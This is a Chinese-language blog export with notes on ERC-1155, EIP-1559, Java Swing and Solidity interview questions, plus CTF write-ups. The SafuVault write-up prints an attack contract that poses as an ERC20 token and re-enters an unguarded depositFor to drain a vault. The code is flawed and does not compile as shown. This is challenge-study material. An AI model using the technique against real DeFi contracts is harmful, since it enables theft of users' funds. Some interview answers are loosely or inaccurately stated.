title="批量余额"></a>批量余额</h3><p>在一次调用中获取多个资产的余额</p><p>相应的 ERC-20 balanceOf 调用同样具有支持批处理的相应函数。 还是做个对比</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC-20</span><br><span class="line">function balanceOf(address owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">// ERC-1155</span><br><span class="line">function balanceOfBatch(</span><br><span class="line">    address[] calldata _owners,</span><br><span class="line">    uint256[] calldata _ids</span><br><span class="line">) external view returns (uint256[] memory);</span><br></pre></td></tr></table></figure><p>调用余额查询更简单的是，我们可以在单次调用中获取多个余额。 参数中传递所有者帐户数组和代币的 id 数组。</p><p>例如，对于给出的 _ids&#x3D;[3, 6, 13] 和 _owners&#x3D;[0xbeef…, 0x1337…, 0x1111…]，返回值将为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    balanceOf(0xbeef...),</span><br><span class="line">    balanceOf(0x1337...),</span><br><span class="line">    balanceOf(0x1111...)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="批量审批"><a href="#批量审批" class="headerlink" title="批量审批"></a>批量审批</h3><p>审批同一地址的所有代币</p><p>还是来看一下ERC115</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC-1155</span><br><span class="line">function setApprovalForAll(</span><br><span class="line">    address _operator,</span><br><span class="line">    bool _approved</span><br><span class="line">) external;</span><br><span class="line"></span><br><span class="line">function isApprovedForAll(</span><br><span class="line">    address _owner,</span><br><span class="line">    address _operator</span><br><span class="line">) external view returns (bool);</span><br></pre></td></tr></table></figure><p>审批过程与 ERC-20 略有不同。 这里不是批准特定金额，而是通过 setApprovalForAll 函数设置操作帐户为已批准或未批准。</p><p>查看当前的审批状态可以通过 isApprovedForAll 完成。 如你所见，要么全部批准，要么不批准。 不能定义要批准代币的数量，甚至代币类型。</p><p>这是考虑到简洁性而故意设计的。 你只能批准一个地址的所有代币。</p><h3 id="接受钩子"><a href="#接受钩子" class="headerlink" title="接受钩子"></a>接受钩子</h3><p>接受钩子的代币函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function onERC1155BatchReceived(</span><br><span class="line">    address _operator,</span><br><span class="line">    address _from,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external returns(bytes4);</span><br></pre></td></tr></table></figure><p>基于 EIP-165(opens in a new tab) 的协议支持，ERC-1155 只支持智能合约的接收钩子函数。 钩子函数必须返回一个事先预定义的 4 字节值，这个值被指定为：<code>bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))</code><br>当接收合约返回这一值时，意味着合约知道如何处理 ERC-1155 代币并接受转账。 太好了，代币不会再卡在合约中了！（这里可能会是漏洞，比如<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/game-assets">点击</a>这个题就是使用到了钩子，让代币困在合约中）</p><h3 id="安全转账"><a href="#安全转账" class="headerlink" title="安全转账"></a>安全转账</h3><p> 现在我们来看一下最重要的规则：</p><p>1，调用者必须获得批准才能从 _from 的帐户地址消费代币，或者调用者帐户地址必须与 _from 的帐户地址相同。<br>2，在以下情况下，转账调用将回退</p><ul><li>_to 地址为 0；</li><li>_ids 的长度与 _values 的长度不同；</li><li>_ids 中代币持有者的任何余额低于发送给接收者的相应 _value 金额。出现任何其他错误。<blockquote><p>注意：包括钩子在内的所有批处理函数也均作为非批处理的版本存在。 这样做是为了提高燃料效率，考虑到只转移一种资产可能仍然是最常用的方式。 简洁起见，我们没有在这里介绍这些非批处理的版本，包括安全转账规则。 名称是相同的，只需移除 ‘Batch’。</p></blockquote></li></ul><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>IERC1155接口，接口中定义了六个函数</p><ul><li>balanceOf()：单币种余额查询，返回account拥有的id种类的代币的持仓量。</li><li>balanceOfBatch()：多币种余额查询，查询的地址accounts数组和代币种类ids数组的长度要相等。</li><li>setApprovalForAll()：批量授权，将调用者的代币授权给operator地址。。</li><li>isApprovedForAll()：查询批量授权信息，如果授权地址operator被account授权，则返回true。</li><li>safeTransferFrom()：安全单币转账，将amount单位id种类的代币从from地址转账给to地址。如果to地址是合约，则会验证是否实现了onERC1155Received()接收函数。</li><li>safeBatchTransferFrom()：安全多币转账，与单币转账类似，只不过转账数量amounts和代币种类ids变为数组，且长度相等。<strong>如果to地址是合约，则会验证是否实现了onERC1155BatchReceived()接收函数。</strong>（重点）</li></ul><p>如果ERC1155TOKEN的接收者receiver是一个合约地址，那么接收者必须要实现该接口。</p><p>该接口有两个函数：（前提是接收者是合约地址）：</p><ul><li>onERC1155Received：这个函数是在调用 ERC1155的 safeTransferFrom()和 _mint()时，接收者的该函数会被调用，并按要求返回指定的值 bytes4(keccak256(“onERC1155Received(address,address,uint256,uint256,bytes)”))。</li><li>onERC1155BatchReceived：这个函数时在调用 ERC1155的 safeBatchTransferFrom()时，接收者的该函数会被调用，并按要求返回指定的值 bytes4(keccak256(“onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)”))</li></ul><p>如果我们不按要求返回一个指定值，那么代币就会转移不出来，困在合约中。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_学生管理系统</title>
      <link href="/2024/10/21/java-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/10/21/java-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要做个一java的学生管理系统，要一段很长时间，还是从零开始，所以就记个笔记，记录一下自己的学习知识，感觉和之前学的网页面有一些知识的关联。</p><p>采用一个java+Swing的框架，</p><h2 id="Swing"><a href="#Swing" class="headerlink" title="Swing"></a>Swing</h2><p>Swing 是一个为Java设计的GUI工具包。</p><p>GUI（图形用户界面）为程序提供图形界面，它最初的设计目的是为程序员构建一个通用的 GUI，使其能够在所有的平台上运行，但 Java 1.0 中基础类 AWT（抽象窗口工具箱）并没有达到这个要求，于是 Swing 出现了，它是 AWT 组件的增强组件，但是它又不能完全替代 AWT 组件，这两种组件需要同时出现在一个图形用户界面中。</p><p>Swing包括了图形用户界面（GUI）器件如：文本框，按钮，分隔窗格和表。</p><p>Swing提供许多比AWT更好的屏幕显示元素。它们用纯Java写成，所以同Java本身一样可以跨平台运行，这一点不像AWT。它们是JFC的一部分。它们支持可更换的面板和主题（各种操作系统默认的特有主题），然而不是真的使用原生平台提供的设备，而是仅仅在表面上模仿它们。这意味着你可以在任意平台上使用JAVA支持的任意面板。轻量级组件的缺点则是执行速度较慢，优点就是可以在所有平台上采用统一的行为。</p><p>我理解的就是一个模拟的软件，类似于UI网页设计</p><h3 id="Swing包"><a href="#Swing包" class="headerlink" title="Swing包"></a>Swing包</h3><p>有三个比较重要的包，Component类，Cotainer类，JComponent类，<br>层次和继承关系：<br>Java.lang.Object-&gt;Java.awt-&gt;Component-&gt;Java.awt.Container-&gt;Javax.swing.JComponent</p><p>Swing 组件中的大多数 GUI 组件都是 Component 类的直接子类或间接子类，JComponent 类是 Swing 组件各种特性的存放位置，这些组件的特性包括设定组件边界、GUI 组件自动滚动等。</p><p>Swing 组件中的最重要的父类是 Container 类，Container 类又有两个最重要的子类，分别为 java.awt.Window 与 java.awt.Frame。除了以往的 AWT 类组件会继承这两个类之外，现在的 Swing 组件同样也会扩展了这两个类</p><h3 id="常见的组件"><a href="#常见的组件" class="headerlink" title="常见的组件"></a>常见的组件</h3><p>JButton :按钮，可以带一些图片或者文字<br>JCheckBox :复选框<br>JComBox :下拉列表框，可以在下拉显示区域多个选项<br>JFrame : 框架类<br>JDialog :对话框<br>JLable :标签组件<br>JRadioButton :单选按钮<br>JList :能够在用户中显示一些列条目的组件<br>JTextField :文本框<br>JPasswordField :密码框<br>JTextArea :文本区域<br>JOptionPane :一些面板</p><h3 id="常见的顶层窗体"><a href="#常见的顶层窗体" class="headerlink" title="常见的顶层窗体"></a>常见的顶层窗体</h3><p>窗体作为 Swing 应用程序中组件的承载体，处于非常重要的位置。Swing 中常用的窗体包括 JFrame 和 JDialog 窗体</p><h4 id="JFrame框架"><a href="#JFrame框架" class="headerlink" title="JFrame框架"></a>JFrame框架</h4><p>JFrame 窗体是一个容器，它是 Swing 程序中各个组件的载体，因此，可以将 JFrame 看作是承载这些 Swing 组件的容器。</p><p>在开发应用程序时，可以通过继承 java.swing.JFrame 类来创建一个窗体，然后再在窗体中添加组件，同时为组件设置事件。由于该窗体继承了 JFrame 类，所以它拥有最大化、最小化和关闭按钮。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JFrame frame = new JFrame(title);</span><br><span class="line">Container container = frame.getContentPane();</span><br></pre></td></tr></table></figure><ul><li>frame：JFrame 类的对象。</li><li>container：Container 类的对象，可以使用 JFrame 对象调用getContentPane() 方法获取。</li></ul><p>我们应该有这样的一个概念，就是 Swing 组件的窗体通常与组件和容器相关，所以在 JFrame 对象创建完成后，需要调用 getContentPane() 方法将窗体转换为容器，然后在容器中添加组件或设置布局管理器。通常这个容器用来包含和显示组件。如果需要将组件添加至容器，那么可以使用来自 Container 类的 add() 方法进行设置，示例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">container.add(new JButton(&quot;按钮&quot;));                     //JButton按钮组件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SafuVault</title>
      <link href="/2024/10/20/CTF-SafuVault/"/>
      <url>/2024/10/20/CTF-SafuVault/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-SafuVault"><a href="#CTF-SafuVault" class="headerlink" title="CTF-SafuVault"></a>CTF-SafuVault</h1><p>这个题的源代码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-vault">这里</a></p><p>题目要求就是：获得不少于保险库的90%代币</p><p>还是先阅读代码，合约<code>SafeVault</code>,是一个安全的收益金库，用于用户存入代币，然后金库会调用策略合约 <code>SafuVault</code>的<code>deposit</code>函数将存入的代币进行投资，用户通过<code>withdraw</code>函数提取它们的代币，其中还有个<code>depositFor</code>函数，允许其他用户为其他人存款，这个收益合约看起来还是功能挺齐全的。<br>而收益生成合约 <code>SafuStrategy</code>,就是来管理存入金库的资金，要想获得资金的话，还是的同通过金库合约，反复查看这个合约的，开始时并没有发现获得资金的方法，查看了提示：所有外部功能都得到妥善保护吗？又去看了金库合约的函数，发现<code>deposit</code>和<code>depositFor</code>函数修饰限定不一样，具体看一下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deposit(uint256 _amount) public nonReentrant &#123;</span><br><span class="line">        strategy.beforeDeposit();</span><br><span class="line"></span><br><span class="line">        uint256 _pool = balance();</span><br><span class="line">        want().safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        earn();</span><br><span class="line">        uint256 _after = balance();</span><br><span class="line">        _amount = _after - _pool; // Additional check for deflationary tokens</span><br><span class="line"></span><br><span class="line">        uint256 shares;</span><br><span class="line">        if (totalSupply() == 0) &#123;</span><br><span class="line">            shares = _amount;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            shares = (_amount * totalSupply()) / (_pool);</span><br><span class="line">        &#125;</span><br><span class="line">        _mint(msg.sender, shares);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function depositFor(</span><br><span class="line">        address token, </span><br><span class="line">        uint256 _amount, </span><br><span class="line">        address user</span><br><span class="line">    ) public &#123;</span><br><span class="line">        strategy.beforeDeposit();</span><br><span class="line"></span><br><span class="line">        uint256 _pool = balance();</span><br><span class="line">        IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        earn();</span><br><span class="line">        uint256 _after = balance();</span><br><span class="line">        _amount = _after - _pool; // Additional check for deflationary tokens</span><br><span class="line"></span><br><span class="line">        uint256 shares;</span><br><span class="line">        if (totalSupply() == 0) &#123;</span><br><span class="line">            shares = _amount;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            shares = (_amount * totalSupply()) / (_pool);</span><br><span class="line">        &#125;</span><br><span class="line">        _mint(user, shares);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>deposit</code>函数有防止重入的功能，而<code>depositFor</code>没有，这是就会联想到，会不会就是重入攻击，再比较这俩个合约，发现<code>depositFor</code>使用了<code>token</code>地址作为参数传入，这个给了很大的操作空间，如果在<code>token</code>地址上进行转账的transfer函数中夹带一个再次存款合约的话，就会进行一个重入攻击，反复存款，最后再<code>withdrawall</code>.就能获得大量的代币</p><p>具体的攻击合约</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;interface IValue &#123;    function depositFor(        address token,         uint256 _amount,         address user    ) internal;    function withdrawAll() external ;    &#125; contract Hack &#123;    IERC20 token;    IValue value;    uint256 loop = 10;    constructor (address _token,address _value)&#123;        token = IERC20(_token);        value = IValue(_value);    &#125;    function pwn() external&#123;        //计算重入几次，获得超过金库合约的90%代币        uint256 amount = token.balanceOf(address(this));        uint256 amount1 = amount /10;        value.depositFor(address(this),amount1,address(this));        value.withdraw();        //此时的msg.sender是我们自己，因为是我们发起pwn        token.transfer(msg.sender,token.balanceOf(address(this)));        &#125;    function transferFrom(address from,address to,address amount1) external&#123;        if(loop&lt;10)&#123;           //此时的msg.sender是金库合约，因为是Value发起的存钱            transfer(msg.sender,amount1);            //执行重入，再次存款            token.depositFor(address(this),amount1,address(this));                     &#125;    &#125; &#125;简单来说，就是我们的攻击合约扮演一个ERC20代币合约，正是由于depoistFor函数将token地址作为参数，这样我们就能改变token地址里的transferFrom函数的内容，进行重入攻击,个人认为就是有一个跨合约的重入攻击，对于ERC20代币必须要有了解。完成。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EIP-1559</title>
      <link href="/2024/10/20/EIP-1559/"/>
      <url>/2024/10/20/EIP-1559/</url>
      
        <content type="html"><![CDATA[<h2 id="EIP-1559"><a href="#EIP-1559" class="headerlink" title="EIP-1559"></a>EIP-1559</h2><p>在做solidity自我检测的时候,第一次,了解到这个协议,就来做个学习笔记</p><h1 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h1><p>首先它是由V神和Ethhub_io创始人Eric Conner于2019年3月联合提出的以太坊交易手续费机制改进提案。这个提案的主要内容就是对向矿工的支付的gas方式做出了改变,它将gas费分为俩部分:基础费(basefee)+矿工小费</p><p>基础费(basefee)就是以太坊网络根据交易需求和区块大小动态调整的。<code>BASEFEE</code>的计算方式是通过一个名为“基础费用追踪器”的算法来实现的。该算法会根据当前区块的交易需求和区块大小来动态调整<code>BASEFEE</code>，以确保交易能够在合理的时间内得到确认。</p><p>EIP-1559协议的核心思想其实有两块：第一块是变更燃料费价格的定价方式，降低整体的燃料费价格，以利于以太坊生态中的各种应用的发展。第二块是原来的以太坊网络中的燃料费全部是矿工的收入，在EIP-1559协议实施后，燃料费的一部分将燃烧掉，不再作为矿工的收入。</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>降低以太坊的矿工费用,维持以太坊网络的稳定</p>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>solidityqestion答案</title>
      <link href="/2024/10/20/solidityqestion%E7%AD%94%E6%A1%88/"/>
      <url>/2024/10/20/solidityqestion%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h2 id="自查"><a href="#自查" class="headerlink" title="自查"></a>自查</h2><p>最近发现个关于solidity面试的问题网站，正好之前又重新温习了solidity的，所以就来做一下<br><a href="https://www.rareskills.io/post/solidity-interview-questions">点击</a>查看面试问题网站</p><h3 id="容易"><a href="#容易" class="headerlink" title="容易"></a>容易</h3><p>1，私有、内部、公共和外部函数之间有什么区别？</p><ul><li><code>private</code>表示只能在合同内部调用其他函数。 <code>internal</code>类似于私有关键字，但也可由继承当前合同的合同调用。 <code>external</code>只能在合同外部调用。<code> public</code>可在任何地方被调用，无论是内部还是外部。</li></ul><p>2，智能合约大约可以有多大？</p><ul><li>24KB</li></ul><p>3，create 和 create2 有什么区别？</p><ul><li>首先它们都是Solidity中重要的操作码，都是用来部署合约的，区别就是，<strong>create</strong>是通过对发送者地址和nonce值进行哈希运算计算新合约的地址的，<code>keccak256(rlp.encode(deployingAddress, nonce))</code>。而<strong>create2</strong>更为复杂，它使用是通过一个公式计算新合约的地址的，这个公式包括，发送者地址，随机数，salt，字节码等参数，<code>keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))</code>，它也有个优点，可以在部署合约之前预测合约地址。</li></ul><p>4，Solidity 0.8.0 版本对算术运算有什么重大变化？</p><ul><li>里面有对整数溢出做出了一个保护</li></ul><p>5，代理需要哪种特殊的 <code>CALL</code> 才能工作？</p><ul><li>一般来说是：<code>delegatecall</code>，因为它主要用于委托调用，允许我们在主合约的上下文中加载和调用另一个合约的代码。被调用合约的代码被执行，但被调用合约所做的任何状态改变实际上是在主合约的存储中进行的，而不是在被调用合约的存储中</li></ul><p>6，在 EIP-1559 之前，如何计算以太坊交易的成本？</p><blockquote><p><code>Ethereum Improvement Proposal (EIP) 1559</code>是以太坊的一个升级，旨在改变以太坊计算和处理网络交易费用（称为“gas费用”）的方式。该升级通过使用基于区块的基础费用<code>basefee</code>和发送方指定的最大费用，而不是对gas价格进行竞价，来更加平衡地激励矿工在高或低网络拥塞期间进行挖矿，从而使以太坊交易更加高效。EIP-1559是一个提案，它改变了gas费用的结构和矿工的奖励方式。该提案于2021年8月5日作为以太坊伦敦硬分叉的一部分实施。<br>gas费 &#x3D; 基础费（<code>Basefee</code>）+ 矿工费（Tip），基础费会根据区块的Gas利用率动态调整，如每个区块的Gas费利用率低于50%，就降低手续费，高于50%，就提高手续费。</p></blockquote><ul><li>关于<a href="https://learnblockchain.cn/article/6914">EIP-1559</a>,可以查看。以以太坊的交易成本有矿工通过拍卖机制来决定的，矿工会选出价高的交易，并将其包含在下一个区块上，交易成本，又俩个因素决定，GasPrice和<code>Gas Limit</code>,<code>Gas Price</code>是以太坊网络中的一种计量单位，用于衡量交易的复杂性。<code>Gas Limit</code>是指交易可以使用的最大Gas数量。交易的成本等于<code>Gas Price</code>乘以Gas Limit。因此，交易的成本取决于<code>Gas Price</code>和<code>Gas Limit</code>的值，这些值由交易的发送者设置。</li></ul><p>7，在区块链上创建随机数有哪些挑战</p><ul><li>不可预测，而且比较困难，因为所有矿工都在一个链上，它们有个共同的共识，如果随意产生伪随机数，那么就可能会导致达不成共识。</li></ul><p>8，荷兰拍卖会和英国拍卖会有什么区别</p><ul><li>这个问感觉和slidity没有太多关系,就不回答了</li></ul><p>9,ERC20 中的 和 有什么区别？<code>transfer</code>和<code>transferFrom</code></p><ul><li><code>transfer</code>是用户直接发送,<code>transferForm</code>是对于用户授权地址进行发送代币,用户可以不用直接参</li><li><code>transfer(address recipient, uint256 amount)</code></li><li><code>transferFrom(address sender, address recipient, uint256 amount)</code></li><li>从上面的表达式也能看出,<code>transfer</code>是直接从当前合约转账给目标合约,<code>transferFrom</code>是可以设置发送账户和目标账户的</li></ul><p>10,哪个更适合用于地址允许列表：映射还是数组？为什么</p><ul><li>数组是可以快速历遍地址列表,而映射可以快速查找地址是否在地址列表中,所以要根据具体的使用情况来决定使用谁</li></ul><p>11,为什么不应该使用 <code>tx.origin</code> 进行身份验证？</p><ul><li><code>tx.origin</code>是发起交易的的人,在 Solidity 中，<code>tx.origin </code>是一个全局变量，它返回发送交易的账户地址。在合约代码中，最常用的是使用 <code>msg.sender </code>来检查授权，但有时由于有些程序员不熟悉 <code>tx.origin </code>和 <code>msg.sender</code> 的区别，如果使用了 <code>tx.origin </code>可能导致合约的安全问题。黑客最典型的攻击场景是利用 <code>tx.origin </code>的代码问题常与钓鱼攻击相结合的组合拳的方式进行攻击。因为 <code>tx.origin </code>返回交易的原始发送者，因为攻击的调用链可能是原始发送者 -&gt; 攻击合约 -&gt; 受攻击合约。在受攻击合约中，<code>tx.origin</code> 是原始发送者。因此，通过调用 <code>tx.origin</code> 来检查授权可能会导致合约受到攻击。为了避免这种情况，建议使用 <code>msg.sender</code> 来检查授权</li></ul><p>12,1 个Ether 相当于 多少个 gwei ？</p><ul><li>1 ether &#x3D; 10^9gwei</li></ul><p>13,1 个Ether 相当于 多少个 wei ？</p><ul><li>1 ether &#x3D; 10^18wei</li></ul><p>14,<code>assert</code> 和 <code>require</code> 之间有什么区别？</p><ul><li><code>require</code> 应该被用于函数中检查条件，<code>assert</code>用于预防不应该发生的情况，即不应该使条件错误。</li></ul><p>15,什么是闪电贷？</p><ul><li>就是无需抵押,就可以借钱,允许在一笔交易中还款</li></ul><p>16,什么是 <code>check-effects-interaction</code> 模式？</p><ul><li><code>Checks-Effects-Interactions</code>模式确保所有通过合约的代码路径在修改合约的状态（<code>Checks</code>）之前完成对所提供的参数的所有必要检查；然后才对状态（<code>Effects</code>）进行任何改变。 在所有计划中的状态变化被写入存储空间之后，它可以调用其他合约中的函数（<code>Interactions</code>）。检查-生效-交互</li></ul><p>17,运行一个单独的质押节点所需的最低以太币数量是多少？</p><ul><li>32个以太币</li></ul><p>18,<code>fallback</code> 和 <code>receive</code> 之间有什么区别？</p><ul><li><code>fallback</code>和<code>receive</code>都是特殊的回调函数，用于处理合约中不存在的函数调用和接收以太币。它们之间的区别在于，<code>fallback</code>函数会在调用合约不存在的函数时被触发，而<code>receive</code>函数只用于处理接收以太币。</li></ul><p>19,如何向没有<code>payable </code>函数、<code>receive </code>或回退的合约发送以太？</p><ul><li>通过自毁合约,将自毁的eth发送给目标合约</li></ul><p>20, <code>view</code> 和 <code>pure </code>之间有什么区别？</p><ul><li><code>view</code>和<code>pure</code>都是函数的修饰符，view可以访问合约中的状态变量，不能修改；<code>pure</code>不能访问也不能修改状态变量。</li></ul><p>21,访问控制是什么，为什么重要？</p><ul><li>访问控制是一种重要的机制，用于限制对智能合约的访问。通过使用访问控制，您可以确保只有经过授权的用户才能执行特定操作或访问敏感信息。这可以帮助保护您的智能合约免受未经授权的访问和攻击。Solidity提供了几种访问控制修饰符，例如<code>public</code>、<code>private</code>、<code>internal</code>和<code>external</code>。这些修饰符用于控制函数和状态变量的可见性和访问权限。</li></ul><p>22, uint256 可以存储的最大值是多少？</p><ul><li>2^256-1</li></ul><p>23,修饰符（modifier）的作用是什么？</p><ul><li>增加对函数的限制或者修饰</li></ul><hr><h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><p>1, <code>transfer </code>和 <code>send </code>之间有什么区别？为什么不应该使用它们？</p><ul><li><code>transfer</code>和<code>send</code>函数都是用于将以太币从一个地址转移到另一个地址的函数。它们之间的区别在于它们的<code>gas</code>限制不同，这可能会导致一些安全问题。因此，您应该使用<code>call</code>函数来转移以太币,但是会有重入攻击风险。<blockquote><p>（transfer函数的gas限制为2300 gas，这意味着如果接收方合约没有实现fallback函数，或者fallback函数消耗的gas超过了2300，那么转账将失败并回滚所有更改。这可以防止重入攻击，但也可能导致一些问题，例如无法向某些合约发送以太币。<br>send函数的gas限制也为2300 gas，但它返回一个布尔值，指示转账是否成功。如果转账失败，它将返回false。但是，如果接收方合约没有实现fallback函数，或者fallback函数消耗的gas超过了2300，那么转账将失败并回滚所有更改。<br>由于这些限制，transfer和send函数已经被认为是不安全的，因此不应该使用它们。相反，您应该使用call函数来转移以太币。call函数没有gas限制，可以向任何地址发送以太币，并且可以指定要发送的gas数量。但是，您应该小心使用call函数，因为它可能会导致一些安全问题，例如重入攻击。）</p></blockquote></li></ul><p>2,代理合约中的存储冲突是什么？</p><ul><li>存储冲突是指多个合约尝试访问同一存储位置时发生的问题。当多个合约同时尝试更新同一存储位置时，可能会发生存储冲突，导致数据不一致或合约无法正常工作。</li></ul><p>3,在权益证明之前后，<code>block.timestamp</code> 发生了什么变化？</p><ul><li>在PoW协议中，<code>block.timestamp</code>表示矿工开始挖掘新块的时间戳。在PoS协议中，<code>block.timestamp</code>表示验证器开始验证新块的时间戳。</li></ul><p>4,什么是抢跑（frontrunning）？</p><ul><li>抢跑就是抢先在别人的交易的执行前执行,它是通过提交更高的gas费用来达到的</li></ul><p>5,以太坊如何确定 EIP-1559 中的 <code>BASEFEE</code></p><ul><li><code>BASEFEE</code>是由以太坊网络根据交易需求和区块大小动态调整的。<code>BASEFEE</code>的计算方式是通过一个名为“基础费用追踪器”的算法来实现的。该算法会根据当前区块的交易需求和区块大小来动态调整<code>BASEFEE</code>，以确保交易能够在合理的时间内得到确认。</li></ul><p>6,什么是 <code>commit-reveal</code> 方案，何时使用它？</p><ul><li>提交-揭示方案（<code>Commit-Reveal Scheme</code>）是一种用于在区块链上进行投票或竞标的协议。该协议的目的是防止参与者在提交投票或竞标之前查看其他参与者的提交，从而保护投票或竞标的公正性。</li></ul><p>7,在什么情况下，<code>abi.encodePacked</code> 可能会产生漏洞？</p><ul><li><code> abi.encodePacked</code>可能会产生漏洞，因为它不会在参数之间添加填充，而是将所有参数拼接在一起。这可能会导致哈希碰撞，从而使攻击者能够伪造交易或执行其他恶意操作。例如，如果攻击者知道您使用<code>abi.encodePacked</code>来编码交易数据，他们可以构造一个具有相同哈希值的交易，从而欺骗您的智能合约。</li></ul><p>8,AMM 如何定价资产？</p><ul><li>通过恒定乘积算法，a * b &#x3D; k ,兑换 m个a 需要的b数量算法 &#x3D; k&#x2F;(a+m) - b ,这里没计算手续费。</li></ul><p>9, 函数参数中的 memory 和 calldata 有什么区别？</p><ul><li>memory：用于声明函数参数将被存储在内存中。内存中的数据只在函数执行期间存在，执行完毕后就被销毁。在函数内部，您可以使用memory关键字来创建临时变量，但是不能在函数之外使用它们。在函数调用期间，函数参数的值将从调用方复制到内存中，并在函数执行完毕后被销毁。<br>calldata：用于声明函数参数将被存储在调用数据区域中。调用数据区域是一个不可修改的区域，用于保存函数参数。在函数内部，您可以使用calldata关键字来访问函数参数，但是不能在函数之外使用它们。在函数调用期间，函数参数的值将从调用方复制到调用数据区域中，并在函数执行完毕后被销毁</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-jpeg-sniper</title>
      <link href="/2024/10/19/CTF-jpeg-sniper/"/>
      <url>/2024/10/19/CTF-jpeg-sniper/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-jpeg-sniper"><a href="#CTF-jpeg-sniper" class="headerlink" title="CTF-jpeg-sniper"></a>CTF-jpeg-sniper</h1><p>这道题的源码在<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/main/src/jpeg-sniper">这里</a></p><p>题目的要求是：铸币</p><p>首先又是要理解这些代码想表达的意思</p><p><code>BaseLaunchpegNTF</code>合约，这个NTF的原型，里面实现了isEOA的修饰器，看到这个，我就想起了前几天才整理的智能合约的漏洞：如何绕过外部账户，实现用合约调用。接下来就是普通的铸币流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function numberMinted(address _owner)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        return balanceOf(_owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _tokenId.current();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// 每个使用者可铸币的数量</span><br><span class="line">    function _mintForUser(address to, uint256 quantity) internal &#123;</span><br><span class="line">        for (uint256 i=0; i&lt;quantity; i++) &#123;</span><br><span class="line">            _mint(to, _tokenId.current());</span><br><span class="line">            _tokenId.increment();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _refundIfOver(uint256 _price) internal &#123;</span><br><span class="line">        if (msg.value &lt; _price) &#123;</span><br><span class="line">            revert Launchpeg__NotEnoughFunds(msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">        if (msg.value &gt; _price) &#123;</span><br><span class="line">            (bool success, ) = msg.sender.call&#123;value: msg.value - _price&#125;(&quot;&quot;);</span><br><span class="line">            if (!success) &#123;</span><br><span class="line">                revert Launchpeg__TransferFailed();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>问题就是出在<code>FlatLaunchpeg</code>合约中，从这个合约中我们可以看到这个<code>publicSaleMint</code>函数,这是我们主要可以调用的铸币函数，一看，果然，有isEOA的修饰，难点也就是这个了，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function publicSaleMint(uint256 _quantity)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        isEOA </span><br><span class="line">        atPhase(Phase.PublicSale)</span><br><span class="line">    &#123;</span><br><span class="line">        if (numberMinted(msg.sender) + _quantity &gt; maxPerAddressDuringMint) &#123;</span><br><span class="line">            revert Launchpeg__CanNotMintThisMany();</span><br><span class="line">        &#125;</span><br><span class="line">        if (totalSupply() + _quantity &gt; collectionSize) &#123;</span><br><span class="line">            revert Launchpeg__MaxSupplyReached();</span><br><span class="line">        